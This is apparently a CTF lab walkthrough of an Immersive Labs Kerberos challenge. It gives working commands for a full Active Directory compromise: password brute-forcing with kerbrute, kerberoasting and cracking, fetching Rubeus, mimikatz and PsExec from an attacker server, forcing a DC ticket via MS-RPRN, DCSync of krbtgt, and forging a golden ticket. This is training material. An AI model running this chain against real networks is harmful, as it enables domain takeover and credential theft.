---
date: 2025-04-24
categories: [CTF, ImmersiveLabs]
title: "IML - Kerberos: Ep.13 – Demonstrate your skills"
tags: ['hashcat', 'john the ripper', 'kerberos', 'mimikatz', 'powershell', 'privilege escalation', 'python', 'rce', 'windows']

description: "Kerberos Ep.13 – Demonstrate your skills - A walkthrough of the challenge with enumeration, exploitation and privilege escalation steps."
---

---
---

# IML - Kerberos: Ep.13 – Demonstrate your skills


![image1](../resources/eb9a0af945024067bf3743669956becf.png)

# ![image2](../resources/5fbcc1d087bc4a43ae0da894139f234d.png)

```bash
./kerbrute bruteuser -d krbtown.local --dc 10.102.11.232 /usr/share/wordlists/krbpasswords.txt s.villanelle

```

![image3](../resources/82229e4cd1ab46b191c60f29b82143d4.png)

- Got valid credentials


![image4](../resources/0852f5bdc6fb4d92bfd3eee703dc469b.png)

- Use credentials to rdp
```bash
xfreerdp /v:10.102.30.15 /u:s.villanelle /d:krbtown.local +clipboard +drives /drive:root,/home/kali /dynamic-resolution

```
- Token: 8dae10


![image5](../resources/ed950f2a96b9467a920841bf851e36d2.png)

- Upload Rubeus to workstation-01

```bash
python3 -m http.server 8080

```

![image6](../resources/903a4b8eef6f40eeaa2eb24239e9302e.png)

```bash
curl http://10.102.30.234:8080/Rubeus.exe > Rubeus.exe

```

![image7](../resources/8acfa91590514a4c8a3c438b7b075882.png)

- Open admin PS - Run rubeus.exe
.\Rubeus.exe kerberoast /user:mssql_svc /outfile:hashes.kerberoast


![image8](../resources/9a3dc2dcdfc541a2a87082f889a2c5d7.png)


![image9](../resources/0da917ac1c294f5bbdb1e9fc2379ee82.png)

- Copy and save hash to Kali (hash.txt)

- Use john (no hashcat):
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt --format=krb5tgs

- Password: **blink182!**

- RDP to wks-02:
```bash
xfreerdp /v:10.102.52.164 /u:mssql_svc /p:blink182! /d:krbtown.local +clipboard +drives /drive:root,/home/kali /dynamic-resolution

```

![image10](../resources/378f60dbf30941bc8d466ee1fdfcad9c.png)

- Set up python server in Tools:
```bash
python -m http.server

```
- Use the native Powershell command to curl (this doesn't corrupt the file):
```bash
(new-object System.Net.WebClient).DownloadFile('http://10.102.149.56:8080/PowerView-Dev.ps1','PowerView-Dev.ps1')

```
- Enumerating for unconstrained delegation:
```bash
Get-DomainComputer -Unconstrained -Properties dnshostname

```

![image11](../resources/92776ade960f4f968a9e5e71889c5e69.png)

- We are already on wks-02

- Set up python server and download Rubeus, MS-RPRN, PsExec64 and mimikatz:
```bash
(new-object System.Net.WebClient).DownloadFile('http://10.102.149.56:8080/Rubeus.exe','Rubeus.exe')

(new-object System.Net.WebClient).DownloadFile('http://10.102.149.56:8080/MS-RPRN.exe','C:\Users\mssql_svc\MS-RPRN.exe')

(new-object System.Net.WebClient).DownloadFile('http://10.102.149.56:8080/PsExec64.exe','C:\Users\mssql_svc\PsExec64.exe')

(new-object System.Net.WebClient).DownloadFile('http://10.102.149.56:8080/mimikatz.exe','C:\Users\mssql_svc\mimikatz.exe')

```
- Open an elevated command prompt and monitor for TGT **(Open in CMD, not PS)**:
```bash
.\Rubeus.exe monitor /interval:1 /nowrap

```
- To force a connection to our compromised host Workstation-02, you can use the MS-RPRN tool by running it on an elevated PowerShell prompt:
```bash
.\MS-RPRN.exe \\DC01.krbtown.local \\Workstation-02.krbtown.local

```

![image12](../resources/fad254bf7daa4721b32200b4b2781661.png)

If no wrap wasn't used:
- Copy the Base64 ticket and paste into Kali (ticket.txt):
**Remove empty lines and white spaces from the Base64 ticket before passing it through Rubeus:**

```python
python3 -c 'f=open("ticket.txt").read();import re;print(re.sub(r"\[\n\t\s\]\*", "", f))'
```
- Copy the output and paste into the command (on Windows):
```bash
[IO.File]::WriteAllBytes("C:\Users\mssql_svc\DC.kirbi", [Convert]::FromBase64String("Base64 Ticket"))

```
(Change the directory to where Rubeus is)

Convert from Base64 and saves it in **DC.kirbi**:

- Load the ticket into memory:
```bash
.\Rubeus.exe ptt /ticket:DC.kirbi

```
or

```bash
.\Rubeus.exe ptt /ticket:\<base64\>

```
or with

```bash
.\mimikatz.exe

kerberos::ptt DC.kirbi

```

![image13](../resources/0fddd00966e6450cb4af1dd908a16818.png)

- Check with klist

![image14](../resources/141340df50624dac9a60844f53a91e3c.png)

- Run:
```bash
.\mimikatz.exe
lsadump::dcsync /domain:krbtown.local /user:krbtgt

```

![image15](../resources/22f73d9f3f8041a6be366e90a1d1ce23.png)

- Copy the NTLM hash and the SID:


![image16](../resources/792d1d115c864d9197ef14e2899a13db.png)


![image17](../resources/c01c6683d0ab4946a1e2ca140849eb58.png)

**\*\* The SID is the highlighted text above - Not including the last part (-502)  
That part is specific to that user account**

- Run mimikatz
- Create Kerberos Golden ticket with the information gathered above:
```bash
kerberos::golden /domain:krbtown.local /sid:S-1-5-21-839606329-3182976252-758991142 /krbtgt:9a60db81a985dd1b22b3d34fa598fe19 /user:Administrator

```
The **/user:** is a username we make up ourselves.

This can be anything but Administrator is less conspicuous


![image18](../resources/0fc9917b07324daf9090b6ffdd1a0071.png)


![image19](../resources/7ec819c264434e379b257c9b860180fa.png)

- Run .\mimikatz.exe again with the following command:
```bash
kerberos::ptt ticket.kirbi

```

![image20](../resources/291e0785ed02449c8b925c0a54227448.png)

- Check with klist

![image21](../resources/fe5cbc4a600244ff896d897f651af9e8.png)

- Now that we have a Golden Ticket in memory (TGT) for administrator on the DC, you can use PsExec to log in to the DC:

```bash
.\PsExec64.exe \\dc01.krbtown.local cmd

```
**\*\*Need to use the DNS name to force the use of Kerberos**


![image22](../resources/cd77966db48f440abd1687b5fd9a8c6c.png)
